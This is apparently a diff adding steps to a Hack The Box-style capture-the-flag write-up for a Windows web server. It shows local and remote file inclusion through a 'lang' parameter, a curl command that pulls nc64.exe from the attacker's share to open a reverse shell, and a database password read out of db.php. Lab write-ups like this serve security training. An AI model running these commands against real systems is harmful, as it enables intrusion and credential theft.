@@ -99,13 +99,114 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ![](./images/2.png)
 
+- It looks like we have a `LFI`
 
+```
+└─$ curl 'http://10.10.10.151/blog/?lang=\Windows\System32\drivers\etc\hosts'
 
+<html>
+...
+</html>
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
 
+# localhost name resolution is handled within DNS itself.
+#       127.0.0.1       localhost
+#       ::1             localhost
+</body>
+</html>
+
+```
+
+- And `RFI`
+
+![](./images/4.png)
+
+- Let's try `RFI`
+```
+└─$ curl 'http://10.10.10.151/blog/?lang=\\10.10.16.9\share\shell.php&cmd=whoami'
+...
+</html>
+nt authority\iusr
+</body>
+</html>
+****
+```
+
+- Let's get reverse shell
+```
+└─$ curl 'http://10.10.10.151/blog/?lang=\\10.10.16.9\share\shell.php&cmd=\\10.10.16.9\share\nc64.exe+10.10.16.9+6666+-e+cmd.exe'
+
+```
+```
+└─$ nc -vlnp 6666                                                                               
+listening on [any] 6666 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.10.151] 49678
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\blog>
+
+```
 ## User
+- `C:\inetpub\wwwroot\` has `user` folder
+```
+PS C:\inetpub\wwwroot\user> dir
+dir
 
 
+    Directory: C:\inetpub\wwwroot\user
 
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        4/11/2019   5:52 AM                css                                                                   
+d-----        4/11/2019   5:23 AM                fonts                                                                 
+d-----        4/11/2019   5:23 AM                images                                                                
+d-----        4/11/2019   5:23 AM                js                                                                    
+d-----        4/11/2019   5:23 AM                vendor                                                                
+-a----        4/11/2019   5:15 PM            108 auth.php                                                              
+-a----        4/11/2019  10:51 AM            337 db.php                                                                
+-a----        4/11/2019   6:18 AM           4639 index.php                                                             
+-a----        4/11/2019   6:10 AM           6463 login.php                                                             
+-a----         4/8/2019  11:04 PM            148 logout.php                                                            
+-a----        10/1/2019   8:42 AM           7192 registration.php                                                      
+-a----        8/14/2019  10:35 PM           7004 registration_old123123123847.php
+```
+
+- `db.php` has creds
+```
+PS C:\inetpub\wwwroot\user> type db.php
+type db.php
+<?php
+// Enter your Host, username, password, database below.
+// I left password empty because i do not set password on localhost.
+$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+  }
+?>
+
+```
+
+- We can try the creds as `Chris` user
 
 
 
